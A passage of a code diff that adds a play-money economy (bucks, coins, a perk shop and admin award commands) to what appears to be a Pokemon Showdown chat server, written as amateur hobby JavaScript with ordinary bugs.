@@ -11,11 +11,1190 @@
  * @license MIT license
  */
 
+var bank = exports.bank = {
+			bucks: function(uid, amount, take) {
+
+ 
+						var data = fs.readFileSync('config/money.csv','utf8')
+				var match = false;
+				var money = 0;
+				var row = (''+data).split("\n");
+				var line = '';
+				for (var i = row.length; i > -1; i--) {
+					if (!row[i]) continue;
+					var parts = row[i].split(",");
+					var userid = toUserid(parts[0]);
+					if (uid.userid == userid) {
+						var x = Number(parts[1]);
+						var money = x;
+						match = true;
+						if (match === true) {
+							line = line + row[i];
+							break;
+						}
+					}
+				}
+				uid.money = money;
+				if (take === true){if (amount <= uid.money){
+				uid.money = uid.money - amount; take = false;}
+				else return false;
+				}
+				else {uid.money = uid.money + amount;}
+				if (match === true) {
+					var re = new RegExp(line,"g");
+					fs.readFile('config/money.csv', 'utf8', function (err,data) {
+					if (err) {
+						return console.log(err);
+					}
+					var result = data.replace(re, uid.userid+','+uid.money);
+					fs.writeFile('config/money.csv', result, 'utf8', function (err) {
+						if (err) return console.log(err);
+					});
+					});
+				} else {
+					var log = fs.createWriteStream('config/money.csv', {'flags': 'a'});
+					log.write("\n"+uid.userid+','+uid.money);
+				}
+				return true;
+				},
+
+	    coins: function(uid, amount, take) {
+
+	    var lore = fs.readFileSync('config/coins.csv','utf8')
+                var match = false;
+                var coins = 0;
+                var spag = (''+lore).split("\n");
+                var hetti = '';
+                for (var i = spag.length; i > -1; i--) {
+                    if (!spag[i]) continue;
+                    var parts = spag[i].split(",");
+                    var userid = toUserid(parts[0]);
+					if (uid.userid == userid) {
+                        var x = Number(parts[1]);
+                        var coins = x;
+                        match = true;
+                        if (match === true) {
+                            hetti = hetti + spag[i];
+                            break;
+                        }
+                    }
+                }
+                uid.coins = coins;
+						if (take === true){if (amount <= uid.coins){
+				uid.coins = uid.coins - amount; take = false;}
+				else return false;
+				}
+				else {uid.coins = uid.coins + amount;}
+
+                if (match === true) {
+                    var be = new RegExp(hetti,"g");
+                    fs.readFile('config/coins.csv', 'utf8', function (err,lore) {
+                        if (err) {
+                            return console.log(err);
+                        }
+                        var result = lore.replace(be, uid.userid+','+uid.coins);
+                        fs.writeFile('config/coins.csv', result, 'utf8', function (err) {
+                            if (err) return console.log(err);
+                        });
+                    });
+                } else {
+                    var log = fs.createWriteStream('config/coins.csv', {'flags': 'a'});
+                    log.write("\n"+uid.userid+','+uid.coins);
+                } return true;
+		}
+
+
+	}
 var crypto = require('crypto');
+var poofeh = true;
+var ipbans = fs.createWriteStream('config/ipbans.txt', {'flags': 'a'});
+var logeval = fs.createWriteStream('logs/eval.txt', {'flags': 'a'});
+var inShop = ['symbol', 'custom', 'animated', 'room', 'trainer', 'fix', 'declare', 'frt'];
+var closeShop = false;
+var closedShop = 0;
+var avatar = fs.createWriteStream('config/avatars.csv', {'flags': 'a'}); // for /customavatar
+//spamroom
+if (typeof spamroom == "undefined") {
+        spamroom = new Object();
+}
+if (!Rooms.rooms.spamroom) {
+        Rooms.rooms.spamroom = new Rooms.ChatRoom("spamroom", "spamroom");
+        Rooms.rooms.spamroom.isPrivate = true;
+}
+if (typeof tells === 'undefined') {
+	tells = {};
+}
 
 const MAX_REASON_LENGTH = 300;
 
 var commands = exports.commands = {
+
+
+
+	createpoints: function(target, room, user, connection) {
+		if(!user.can('hotpatch')) return this.sendReply('You do not have enough authority to do this.');
+		fs.exists('config/money.csv', function (exists) {
+			if(exists){
+				return connection.sendTo(room, 'Since this file already exists, you cannot do this.');
+			} else {
+				fs.writeFile('config/money.csv', 'blakjack,1e+999', function (err) {
+					if (err) throw err;
+					console.log('config/money.csv created.');
+					connection.sendTo(room, 'config/money.csv created.');
+				});
+			}
+		});
+	},
+
+
+	createcoins: function(target, room, user, connection) {
+		if (!user.can('hotpatch')) return this.sendReply('You do not have enough authority to do this.');
+		fs.exists('config/coins.csv', function (exists) {
+			if (exists) {
+				return connection.sendTo(room, 'This file already exists so you do not need to create it again.')
+			} else {
+				fs.writeFile('config/coins.csv', 'blakjack,1e+999', function (err) {
+					if (err) throw err;
+					console.log('config/coins.csv created.');
+					connection.sendTo(room, 'config/coins.csv created,');
+				});
+			}
+		});
+	},
+
+
+
+	/*********************************************************
+	 * Money                                     
+	 *********************************************************/
+
+	bp: 'atm',
+	wallet: 'atm',
+	satchel: 'atm',
+	fannypack: 'atm',
+	purse: 'atm',
+	bag: 'atm',
+	atm: function(target, room, user, connection, cmd) {
+	if (!this.canBroadcast()) return;
+	var cMatch = false;
+	var mMatch = false;
+	var money = 0;
+	var coins = 0;
+	var total = '';
+	if (!target) {
+	var data = fs.readFileSync('config/money.csv','utf8')
+		var row = (''+data).split("\n");
+		for (var i = row.length; i > -1; i--) {
+			if (!row[i]) continue;
+			var parts = row[i].split(",");
+			var userid = toUserid(parts[0]);
+			if (user.userid == userid) {
+			var x = Number(parts[1]);
+			var money = x;
+			mMatch = true;
+			if (mMatch === true) {
+				break;
+			}
+			}
+		}
+		if (mMatch === true) {
+			var p = 'bucks';
+			if (money < 2) p = 'buck';
+			total += user.name + ' has ' + money + ' ' + p + '.<br />';
+		}
+		if (mMatch === false) {
+			total += 'You have no bucks.<br />';
+		}
+		user.money = money;
+		var data = fs.readFileSync('config/coins.csv','utf8')
+		var row = (''+data).split("\n");
+		for (var i = row.length; i > -1; i--) {
+			if (!row[i]) continue;
+			var parts = row[i].split(",");
+			var userid = toUserid(parts[0]);
+			if (user.userid == userid) {
+			var x = Number(parts[1]);
+			var coins = x;
+			cMatch = true;
+			if (cMatch === true) {
+				break;
+			}
+			}
+		}
+		if (cMatch === true) {
+			var p = 'coins';
+			if (coins < 2) p = 'coin';
+			total += user.name + ' has ' + coins + ' ' + p + '.'
+		}
+		if (cMatch === false) {
+			total += 'You have no coins.'
+		}
+		user.coins = coins;
+	} else {
+		var data = fs.readFileSync('config/money.csv','utf8')
+		target = this.splitTarget(target);
+		var targetUser = this.targetUser;
+		if (!targetUser) {
+			return this.sendReply('User '+this.targetUsername+' not found.');
+		}
+		var money = 0;
+		var row = (''+data).split("\n");
+		for (var i = row.length; i > -1; i--) {
+			if (!row[i]) continue;
+			var parts = row[i].split(",");
+			var userid = toUserid(parts[0]);
+			if (targetUser.userid == userid || target == userid) {
+			var x = Number(parts[1]);
+			var money = x;
+			mMatch = true;
+			if (mMatch === true) {
+				break;
+			}
+			}
+		}
+		if (mMatch === true) {
+			var p = 'bucks';
+			if (money < 2) p = 'buck';
+			total += targetUser.name + ' has ' + money + ' ' + p + '.<br />';
+		} 
+		if (mMatch === false) {
+			total += targetUser.name + ' has no bucks.<br />';
+		}
+		targetUser.money = money;
+		var data = fs.readFileSync('config/coins.csv','utf8')
+		var coins = 0;
+		var row = (''+data).split("\n");
+		for (var i = row.length; i > -1; i--) {
+			if (!row[i]) continue;
+			var parts = row[i].split(",");
+			var userid = toUserid(parts[0]);
+			if (targetUser.userid == userid || target == userid) {
+			var x = Number(parts[1]);
+			var coins = x;
+			cMatch = true;
+			if (cMatch === true) {
+				break;
+			}
+			}
+		}
+		if (cMatch === true) {
+			var p = 'coins';
+			if (coins < 2) p = 'coin';
+			total += targetUser.name + ' has ' + coins + ' ' + p + '.<br />';
+		} 
+		if (cMatch === false) {
+			total += targetUser.name + ' has no coins.<br />';
+		}
+		targetUser.coins = coins;
+	}
+	return this.sendReplyBox(total);
+	},
+
+	awardbucks: 'givebucks',
+	gb: 'givebucks',
+	givebucks: function(target, room, user) {
+		if(!user.can('hotpatch')) return this.sendReply('You do not have enough authority to do this.');
+		if(!target) return this.parse('/help givebucks');
+		if (target.indexOf(',') != -1) {
+			var parts = target.split(',');
+			parts[0] = this.splitTarget(parts[0]);
+			var targetUser = this.targetUser;
+		if (!targetUser) {
+			return this.sendReply('User '+this.targetUsername+' not found.');
+		}
+		if (isNaN(parts[1])) {
+			return this.sendReply('Very funny, now use a real number.');
+		}
+		var cleanedUp = parts[1].trim();
+		var giveMoney = Number(cleanedUp);
+		var data = fs.readFileSync('config/money.csv','utf8')
+		var match = false;
+		var money = 0;
+		var line = '';
+		var row = (''+data).split("\n");
+		for (var i = row.length; i > -1; i--) {
+			if (!row[i]) continue;
+			var parts = row[i].split(",");
+			var userid = toUserid(parts[0]);
+			if (targetUser.userid == userid) {
+			var x = Number(parts[1]);
+			var money = x;
+			match = true;
+			if (match === true) {
+				line = line + row[i];
+				break;
+			}
+			}
+		}
+		targetUser.money = money;
+		targetUser.money += giveMoney;
+		if (match === true) {
+			var re = new RegExp(line,"g");
+			fs.readFile('config/money.csv', 'utf8', function (err,data) {
+			if (err) {
+				return console.log(err);
+			}
+			var result = data.replace(re, targetUser.userid+','+targetUser.money);
+			fs.writeFile('config/money.csv', result, 'utf8', function (err) {
+				if (err) return console.log(err);
+			});
+			});
+		} else {
+			var log = fs.createWriteStream('config/money.csv', {'flags': 'a'});
+			log.write("\n"+targetUser.userid+','+targetUser.money);
+		}
+		var p = 'bucks';
+		if (giveMoney < 2) p = 'buck';
+		this.sendReply(targetUser.name + ' was given ' + giveMoney + ' ' + p + '. This user now has ' + targetUser.money + ' bucks.');
+		targetUser.send(user.name + ' has given you ' + giveMoney + ' ' + p + '.');
+		} else {
+			return this.parse('/help givebucks');
+		}
+	},
+
+	/*transferbucks: function(target, room, user) {
+		if(!target) return this.parse('...');
+		if (target.indexOf(',') != -1) {
+			var parts = target.split(',');
+			parts[0] = this.splitTarget(parts[0]);
+			var targetUser = this.targetUser;
+		if (!targetUser) {
+			return this.sendReply('User '+this.targetUsername+' not found.');
+		}
+		if (isNaN(parts[1])) {
+			return this.sendReply('Very funny, now use a real number.');
+		}
+		var cleanedUp = parts[1].trim();
+		var giveMoney = Number(cleanedUp);
+		var data = fs.readFileSync('config/money.csv','utf8')
+		var match = false;
+		var money = 0;
+		var line = '';
+		var row = (''+data).split("\n");
+		for (var i = row.length; i > -1; i--) {
+			if (!row[i]) continue;
+			var parts = row[i].split(",");
+			var userid = toUserid(parts[0]);
+			if (targetUser.userid == userid) {
+			var x = Number(parts[1]);
+			var money = x;
+			match = true;
+			if (match === true) {
+				line = line + row[i];
+				break;
+			}
+			}
+		}
+		targetUser.money = money;
+		targetUser.money += giveMoney;
+		user.money = money;
+		user.money -= giveMoney;
+		if (user.money < giveMoney) { return this.sendReply('You don\'t have enough money to give'); }
+		if (match === true) {
+			var re = new RegExp(line,"g");
+			fs.readFile('config/money.csv', 'utf8', function (err,data) {
+			if (err) {
+				return console.log(err);
+			}
+			var result = data.replace(re, targetUser.userid+','+targetUser.money);
+			var userresult = data.replace(re, user.userid+','+user.money);
+			fs.writeFile('config/money.csv', result, 'utf8', function (err) {
+				if (err) return console.log(err);
+			});
+				fs.writeFile('config/money.csv', userresult, 'utf8', function (err) {
+				if (err) return console.log(err);
+			});
+			});
+		} else {
+			var log = fs.createWriteStream('config/money.csv', {'flags': 'a'});
+			log.write("\n"+targetUser.userid+','+targetUser.money);
+		}
+		var p = 'bucks';
+		if (giveMoney < 2) p = 'buck';
+		this.sendReply(targetUser.name + ' was given ' + giveMoney + ' ' + p + '. This user now has ' + targetUser.money + ' bucks.');
+		targetUser.send(user.name + ' has given you ' + giveMoney + ' ' + p + '.');
+		} else {
+			return this.parse('/help givebucks');
+		}
+	},*/
+
+	takebucks: 'removebucks',
+	removebucks: function(target, room, user) {
+		if(!user.can('hotpatch')) return this.sendReply('You do not have enough authority to do this.');
+		if(!target) return this.parse('/help removebucks');
+		if (target.indexOf(',') != -1) {
+			var parts = target.split(',');
+			parts[0] = this.splitTarget(parts[0]);
+			var targetUser = this.targetUser;
+		if (!targetUser) {
+			return this.sendReply('User '+this.targetUsername+' not found.');
+		}
+		if (isNaN(parts[1])) {
+			return this.sendReply('Very funny, now use a real number.');
+		}
+		var cleanedUp = parts[1].trim();
+		var takeMoney = Number(cleanedUp);
+		var data = fs.readFileSync('config/money.csv','utf8')
+		var match = false;
+		var money = 0;
+		var line = '';
+		var row = (''+data).split("\n");
+		for (var i = row.length; i > -1; i--) {
+			if (!row[i]) continue;
+			var parts = row[i].split(",");
+			var userid = toUserid(parts[0]);
+			if (targetUser.userid == userid) {
+			var x = Number(parts[1]);
+			var money = x;
+			match = true;
+			if (match === true) {
+				line = line + row[i];
+				break;
+			}
+			}
+		}
+		targetUser.money = money;
+		targetUser.money -= takeMoney;
+		if (match === true) {
+			var re = new RegExp(line,"g");
+			fs.readFile('config/money.csv', 'utf8', function (err,data) {
+			if (err) {
+				return console.log(err);
+			}
+			var result = data.replace(re, targetUser.userid+','+targetUser.money);
+			fs.writeFile('config/money.csv', result, 'utf8', function (err) {
+				if (err) return console.log(err);
+			});
+			});
+		} else {
+			var log = fs.createWriteStream('config/money.csv', {'flags': 'a'});
+			log.write("\n"+targetUser.userid+','+targetUser.money);
+		}
+		var p = 'bucks';
+		if (takeMoney < 2) p = 'buck';
+		this.sendReply(targetUser.name + ' has had ' + takeMoney + ' ' + p + ' removed. This user now has ' + targetUser.money + ' bucks.');
+		targetUser.send(user.name + ' has removed ' + takeMoney + ' bucks from you.');
+		} else {
+			return this.parse('/help removebucks');
+		}
+	},
+
+	buy: function(target, room, user) {
+		if (!target) return this.parse('/help buy');
+		if (closeShop) return this.sendReply('The shop is currently closed and will open shortly.');
+		var data = fs.readFileSync('config/money.csv','utf8')
+		var match = false;
+		var money = 0;
+		var line = '';
+		var row = (''+data).split("\n");
+		for (var i = row.length; i > -1; i--) {
+			if (!row[i]) continue;
+			var parts = row[i].split(",");
+			var userid = toUserid(parts[0]);
+			if (user.userid == userid) {
+			var x = Number(parts[1]);
+			var money = x;
+			match = true;
+			if (match === true) {
+				line = line + row[i];
+				break;
+			}
+			}
+		}
+		user.money = money;
+		var price = 0;
+		if (target === 'symbol') {
+			price = 5;
+			if (price <= user.money) {
+				user.money = user.money - price;
+				this.sendReply('You have purchased a custom symbol. You will have this until you log off for more than an hour.');
+				this.sendReply('Use /customsymbol [symbol] to change your symbol now!');
+				user.canCustomSymbol = true;
+				this.add(user.name + ' has purchased a custom symbol!');
+			} else {
+				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
+			}
+		}
+		if (target === 'custom') {
+			price = 20;
+			if (price <= user.money) {
+				user.money = user.money - price;
+				this.sendReply('You have purchased a custom avatar. You need to message an Admin capable of adding (Ask BlakJack or macrarazy).');
+				user.canCustomAvatar = true;
+				this.add(user.name + ' has purchased a custom avatar!');
+			} else {
+				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
+			}
+		}
+		if (target === 'animated') {
+			price = 35;
+			if (price <= user.money) {
+				user.money = user.money - price;
+				this.sendReply('You have purchased a custom animated avatar. You need to message an Admin capable of adding (BlakJack or macrarazy).');
+				user.canAnimatedAvatar = true;
+				this.add(user.name + ' has purchased a custom animated avatar!');
+			} else {
+				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
+			}
+		}
+		if (target === 'room') {
+			price = 100;
+			if (price <= user.money) {
+				user.money = user.money - price;
+				this.sendReply('You have purchased a chat room. Make your Room using the command /chatroom [roomname]!');
+				user.canChatRoom = true;
+				this.add(user.name + ' has purchased a chat room!');
+			} else {
+				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
+			}
+		}
+		if (target === 'trainer') {
+			price = 30;
+			if (price <= user.money) {
+				user.money = user.money - price;
+				this.sendReply('You have purchased a trainer card. You need to message an Admin capable of adding this (BlakJack or macrarazy).');
+				user.canTrainerCard = true;
+				this.add(user.name + ' has purchased a trainer card!');
+			} else {
+				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
+			}
+		}
+		if (target === 'fix') {
+			price = 10;
+			if (price <= user.money) {
+				user.money = user.money - price;
+				this.sendReply('You have purchased the ability to alter your avatar or trainer card. You need to message an Admin capable of adding this (BlakJack or macrarazy).');
+				user.canFixItem = true;
+				this.add(user.name + ' has purchased the ability to set alter their card or avatar!');
+			} else {
+				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
+			}
+		}
+		if (target === 'declare') {
+			price = 25;
+			if (price <= user.money) {
+				user.money = user.money - price;
+				this.sendReply('You have purchased the ability to declare (from Admin). To do this message an Admin (~) with the message you want to send. Keep it sensible!');
+				user.canDecAdvertise = true;
+				this.add(user.name + ' has purchased the ability to declare from an Admin!');
+			} else {
+				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
+			}
+		}
+		if (target === 'forcerename') {
+			price = 10;
+			if (price <= user.money) {
+				user.money = user.money - price;
+				this.sendReply('You have purchased the ability to forcerename yourself to whatever you wish...');
+				this.sendReply('Do /frtme [new name] to frt yourself! Remember to not impersonate anyone. Your new name will be removed after refreshing the page. You can only re-rename yourself once by asking an admin.');
+				user.canForceRename = true;
+				this.add(user.name + ' has purchased the ability to rename themself to anything they want to!');
+			} else {
+				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
+			}
+		}
+				if (match === true) {
+			var re = new RegExp(line,"g");
+			fs.readFile('config/money.csv', 'utf8', function (err,data) {
+			if (err) {
+				return console.log(err);
+			}
+			var result = data.replace(re, user.userid+','+user.money);
+			fs.writeFile('config/money.csv', result, 'utf8', function (err) {
+				if (err) return console.log(err);
+			});
+			});
+		} else {
+					var log = fs.createWriteStream('config/money.csv', {'flags': 'a'});
+					log.write("\n"+user.userid+','+user.money);
+				}
+
+			var bunnywheel = 0;
+		var stringbit = 0;
+		if (target === 'coin') { 
+		// change costV
+		bunnywheel = 100;
+		// change cost^
+		take = true;
+		hipe = user;
+		amount = bunnywheel;
+		checkatm = bank.bucks(hipe, amount, take);
+		    if (checkatm == true) {
+
+                  hipe = user;
+                             //change payoutV
+				  amount = 1;
+		            // change payout^
+				  take = false;
+				  bank.coins(hipe, amount);
+				this.sendReply('You put together ' +bunnywheel +' bucks and put it in change machine!');
+				this.add(+ user.name + ' has activated the change machine and through hardwork and the sacrifice of many innocent bucks has made one whole coin!');
+			} else {
+                return this.sendReply('You do not have enough bucks to do this! You need ' + (bunnywheel - user.money) + ' more bucks to make a coin!');
+            } 
+			}
+
+			if (target == 'buck')
+		{
+		// change costV
+		bitshredder = 1;
+		//change cost^
+		take = true;
+		hipe = user;
+		russianfunny = bitshredder;
+		checkatm = bank.coins(hipe, russianfunny, take);
+		    if (checkatm == true) {
+
+                  hipe = user;    
+                                   //change payoutV
+				  russianfunny = 100;
+				  // change payout^
+				  take = false;
+				  bank.bucks(hipe, russianfunny);
+				this.sendReply('You put a coin into the change machine!');
+				this.add(+ user.name + ' has activated the change machine and dropped a coin into it! as it lets out a  faint scream and 100 bucks come out!');
+			} else {
+                return this.sendReply('You do not have enough coins to do this! You need ' + (bitshredder - user.coins) + ' more coins to make 100 bucks!');
+            } 
+			}
+
+                        
+
+
+
+
+	},
+
+	/*buyweapon: function(target, room, user) {
+		if (!target) return this.parse('That isn\'t a weapon');
+		if (!users.get('Siiilver')) return this.sendReply('Silver the blacksmith isn\'t online....');
+		var data = fs.readFileSync('config/money.csv','utf8')
+		var match = false;
+		var money = 0;
+		var line = '';
+		var row = (''+data).split("\n");
+		for (var i = row.length; i > -1; i--) {
+			if (!row[i]) continue;
+			var parts = row[i].split(",");
+			var userid = toUserid(parts[0]);
+			if (user.userid == userid) {
+			var x = Number(parts[1]);
+			var money = x;
+			match = true;
+			if (match === true) {
+				line = line + row[i];
+				break;
+			}
+			}
+		}
+		user.money = money;
+		var price = 0;
+		
+		if (target === 'banhammer') {
+			price = 20;
+			if (price <= user.money) {
+				user.money = user.money - price;
+				this.sendReply('You have purchased a banhammer.');
+				user.canCustomAvatar = true;
+				this.add(user.name + ' has purchased a brahammer from the blacksmith shop!');
+			} else {
+				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
+			}
+		}
+		if (target === 'animated') {
+			price = 35;
+			if (price <= user.money) {
+				user.money = user.money - price;
+				this.sendReply('You have purchased a custom animated avatar. You need to message an Admin capable of adding (BlakJack or Skarr).');
+				user.canAnimatedAvatar = true;
+				this.add(user.name + ' has purchased a custom animated avatar!');
+			} else {
+				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
+			}
+		}
+		if (target === 'room') {
+			price = 100;
+			if (price <= user.money) {
+				user.money = user.money - price;
+				this.sendReply('You have purchased a chat room. You need to message an Admin so that the room can be made.');
+				user.canChatRoom = true;
+				this.add(user.name + ' has purchased a chat room!');
+			} else {
+				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
+			}
+		}
+		if (target === 'trainer') {
+			price = 30;
+			if (price <= user.money) {
+				user.money = user.money - price;
+				this.sendReply('You have purchased a trainer card. You need to message an Admin capable of adding this (BlakJack or Skarr).');
+				user.canTrainerCard = true;
+				this.add(user.name + ' has purchased a trainer card!');
+			} else {
+				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
+			}
+		}
+		if (target === 'fix') {
+			price = 10;
+			if (price <= user.money) {
+				user.money = user.money - price;
+				this.sendReply('You have purchased the ability to alter your avatar or trainer card. You need to message an Admin capable of adding this (BlakJack or Skarr).');
+				user.canFixItem = true;
+				this.add(user.name + ' has purchased the ability to set alter their card or avatar!');
+			} else {
+				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
+			}
+		}
+		if (target === 'declare') {
+			price = 25;
+			if (price <= user.money) {
+				user.money = user.money - price;
+				this.sendReply('You have purchased the ability to declare (from Admin). To do this message an Admin (~) with the message you want to send. Keep it sensible!');
+				user.canDecAdvertise = true;
+				this.add(user.name + ' has purchased the ability to declare from an Admin!');
+			} else {
+				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
+			}
+		}
+				if (match === true) {
+			var re = new RegExp(line,"g");
+			fs.readFile('config/money.csv', 'utf8', function (err,data) {
+			if (err) {
+				return console.log(err);
+			}
+			var result = data.replace(re, user.userid+','+user.money);
+			fs.writeFile('config/money.csv', result, 'utf8', function (err) {
+				if (err) return console.log(err);
+			});
+			});
+		} else {
+					var log = fs.createWriteStream('config/money.csv', {'flags': 'a'});
+					log.write("\n"+user.userid+','+user.money);
+				}
+	},*/
+
+	customsymbol: function(target, room, user) {
+		if(!user.canCustomSymbol) return this.sendReply('You need to buy this item from the shop to use.');
+		if(!target || target.length > 1) return this.sendReply('/customsymbol [symbol] - changes your symbol (usergroup) to the specified symbol. The symbol can only be one character');
+		var a = target;
+		if (a === "+" || a === "$" || a === "%" || a === "@" || a === "&" || a === "~" || a === "#" || a === "a" || a === "b" || a === "c" || a === "d" || a === "e" || a === "f" || a === "g" || a === "h" || a === "i" || a === "j" || a === "k" || a === "l" || a === "m" || a === "n" || a === "o" || a === "p" || a === "q" || a === "r" || a === "s" || a === "t" || a === "u" || a === "v" || a === "w" || a === "x" || a === "y" || a === "z") {
+			return this.sendReply('Sorry, but you cannot change your symbol to this for safety/stability reasons.');
+		}
+		user.getIdentity = function(){
+			if(this.muted)	return '!' + this.name;
+			if(this.locked) return '‽' + this.name;
+			return target + this.name;
+		};
+		user.updateIdentity();
+		user.canCustomSymbol = false;
+	},
+
+	frtme: function(target, room, user) {
+		if (!user.canForceRename) return this.sendReply('You have to buy this from the shop first!');
+
+		if (!target) {
+			return this.sendReply("No new name chosen.");
+		}
+		user.forceRename(target)
+		user.canForceRename = false;
+
+	},
+
+	/*chatroom: function(target, room, user) {
+		if (!user.canChatroom) return false;
+		return this.sendReply('You have to buy this from the shop first!');
+		
+		var id = toId(target);
+		if (Rooms.rooms[id]) {
+			return this.sendReply("The room '"+target+"' already exists.");
+		}
+		if (Rooms.global.addChatRoom(target)) {
+			return this.sendReply("The room '"+target+"' was created.");
+		}
+		user.canChatroom = false;
+	},*/
+
+	shop: function(target, room, user) {
+		if (!this.canBroadcast()) return;
+		this.sendReplyBox('<center><h4><b><u>Voyage Shop</u></b></h4><table border="1" cellspacing ="0" cellpadding="3"><tr><th>Command</th><th>Description</th><th>Cost</th></tr>' +
+			'<tr><td>Symbol</td><td>Buys a custom symbol to go infront of name and puts you at top of userlist (temporary until restart)</td><td>5</td></tr>' +
+			'<tr><td>Custom</td><td>Buys a custom avatar to be applied to your name (you supply)</td><td>20</td></tr>' +
+			'<tr><td>Animated</td><td>Buys an animated avatar to be applied to your name (you supply)</td><td>35</td></tr>' +
+			'<tr><td>Room</td><td>Buys a chatroom for you to own (within reason, can be refused)</td><td>100</td></tr>' +
+			'<tr><td>Trainer</td><td>Buys a trainer card which shows information through a command such as /mac (note: third image costs 10 bucks extra, ask for more details)</td><td>40</td></tr>' +
+			'<tr><td>Fix</td><td>Buys the ability to alter your current custom avatar or trainer card (don\'t buy if you have neither)!</td><td>10</td></tr>' +
+			'<tr><td>Declare</td><td>You get the ability to get two declares from an Admin in lobby. This can be used for league advertisement (not server)</td><td>25</td></tr>' +
+			'<tr><td>Forcerename</td><td>You get the ability to rename yourself to anything you want, rank symbol will remain (name should be appropriate)</td><td>10</td></tr>' +
+			'</table><center><table border="1" cellspacing ="0" cellpadding="4"><tr><th>Command</th><th>change converter!</th><th>PAYOUT</th></tr>' +
+		        '<tr><td>Coin</td><td>Turns <b>100 bucks</b> into <b>1 coin</b>!</td><td>1 coin</td></tr>' +
+		        '<tr><td>Buck</td><td>Turns <b>1 coin</b> into <b>100 bucks</b>!</td><td>100 bucks</td></tr>' +
+			'</table><br />To buy an item from the shop, use /buy [command]. <br />Also do /moneycommands to view money based commands.</center>'
+			);
+		if (closeShop) return this.sendReply('|raw|<center><h3><b>The shop is currently closed and will open shortly.</b></h3></center>');
+	},
+
+	lockshop: 'closeshop',
+	closeshop: function(target, room, user) {
+		if (!user.can('hotpatch')) return this.sendReply('You do not have enough authority to do this.');
+
+		if(closeShop && closedShop === 1) closedShop--;
+
+		if (closeShop) {
+			return this.sendReply('The shop is already closed. Use /openshop to open the shop to buyers.');
+		}
+		else if (!closeShop) {
+			if (closedShop === 0) {
+				this.sendReply('Are you sure you want to close the shop? People will not be able to buy anything. If you do, use the command again.');
+				closedShop++;
+			}
+			else if (closedShop === 1) {
+				closeShop = true;
+				closedShop--;
+				this.add('|raw|<center><h4><b>The shop has been temporarily closed, during this time you cannot buy items.</b></h4></center>');
+			}
+		}
+	},
+
+	openshop: function(target, room, user) {
+		if (!user.can('hotpatch')) return this.sendReply('You do not have enough authority to do this.');
+
+		if (!closeShop && closedShop === 1) closedShop--;
+
+		if (!closeShop) {
+			return this.sendRepy('The shop is already closed. Use /closeshop to close the shop to buyers.');
+		}
+		else if (closeShop) {
+			if (closedShop === 0) {
+				this.sendReply('Are you sure you want to open the shop? People will be able to buy again. If you do, use the command again.');
+				closedShop++;
+			}
+			else if (closedShop === 1) {
+				closeShop = false;
+				closedShop--;
+				this.add('|raw|<center><h4><b>The shop has been opened, you can now buy from the shop.</b></h4></center>');
+			}
+		}
+	},
+
+	shoplift: 'awarditem',
+	giveitem: 'awarditem',
+	awarditem: function(target, room, user) {
+		if (!target) return this.parse('/help awarditem');
+		if(!user.can('hotpatch')) return this.sendReply('You do not have enough authority to do this.');
+
+		target = this.splitTarget(target);
+		var targetUser = this.targetUser;
+
+		if (!target) return this.parse('/help awarditem');
+		if (!targetUser) {
+			return this.sendReply('User '+this.targetUsername+' not found.');
+		}
+
+		var matched = false;
+		var isItem = false;
+		var theItem = '';
+		for (var i = 0; i < inShop.length; i++) {
+			if (target.toLowerCase() === inShop[i]) {
+				isItem = true;
+				theItem = inShop[i];
+			}
+		}
+		if (isItem === true) {
+			if (theItem === 'symbol') {
+				if (targetUser.canCustomSymbol === true) {
+					return this.sendReply('This user has already bought that item from the shop... no need for another.');
+				}
+				if (targetUser.canCustomSymbol === false) {
+					matched = true;
+					this.sendReply(targetUser.name + ' can now use /customsymbol to get a custom symbol.');
+					targetUser.canCustomSymbol = true;
+					Rooms.rooms.lobby.add(user.name + ' has stolen custom symbol from the shop!');
+					targetUser.send(user.name + ' has given you ' + theItem + '! Use /customsymbol [symbol] to add the symbol!');
+				}
+			}
+			if (theItem === 'custom') {
+				if (targetUser.canCustomAvatar === true) {
+					return this.sendReply('This user has already bought that item from the shop... no need for another.');
+				}
+				if (targetUser.canCustomAvatar === false) {
+					matched = true;
+					targetUser.canCustomSymbol = true;
+					Rooms.rooms.lobby.add(user.name + ' has stolen a custom avatar from the shop!');
+					targetUser.send(user.name + ' has given you ' + theItem + '!');
+				}
+			}
+			if (theItem === 'animated') {
+				if (targetUser.canAnimated === true) {
+					return this.sendReply('This user has already bought that item from the shop... no need for another.');
+				}
+				if (targetUser.canCustomAvatar === false) {
+					matched = true;
+					targetUser.canCustomAvatar = true;
+					Rooms.rooms.lobby.add(user.name + ' has stolen a custom avatar from the shop!');
+					targetUser.send(user.name + ' has given you ' + theItem + '!');
+				}
+			}
+			if (theItem === 'room') {
+				if (targetUser.canChatRoom === true) {
+					return this.sendReply('This user has already bought that item from the shop... no need for another.');
+				}
+				if (targetUser.canChatRoom === false) {
+					matched = true;
+					targetUser.canChatRoom = true;
+					Rooms.rooms.lobby.add(user.name + ' has stolen a chat room from the shop!');
+					targetUser.send(user.name + ' has given you ' + theItem + '!');
+				}
+			}
+			if (theItem === 'trainer') {
+				if (targetUser.canTrainerCard === true) {
+					return this.sendReply('This user has already bought that item from the shop... no need for another.');
+				}
+				if (targetUser.canTrainerCard === false) {
+					matched = true;
+					targetUser.canTrainerCard = true;
